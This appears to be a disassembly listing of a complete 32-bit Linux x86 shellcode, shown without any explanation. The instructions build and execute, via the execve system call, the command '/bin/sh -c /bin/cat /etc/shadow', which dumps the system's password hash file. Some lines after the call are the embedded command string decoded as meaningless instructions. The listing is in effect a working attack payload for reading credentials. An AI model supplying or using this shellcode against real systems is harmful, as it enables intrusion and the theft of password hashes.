00000000  6A0B              push byte +0xb
00000002  58                pop eax
00000003  99                cdq
00000004  52                push edx
00000005  66682D63          push word 0x632d
00000009  89E7              mov edi,esp
0000000B  682F736800        push dword 0x68732f
00000010  682F62696E        push dword 0x6e69622f
00000015  89E3              mov ebx,esp
00000017  52                push edx
00000018  E815000000        call dword 0x32
0000001D  2F                das
0000001E  62696E            bound ebp,[ecx+0x6e]
00000021  2F                das
00000022  636174            arpl [ecx+0x74],sp
00000025  202F              and [edi],ch
00000027  657463            gs jz 0x8d
0000002A  2F                das
0000002B  7368              jnc 0x95
0000002D  61                popad
0000002E  646F              fs outsd
00000030  7700              ja 0x32
00000032  57                push edi
00000033  53                push ebx
00000034  89E1              mov ecx,esp
00000036  CD80              int 0x80
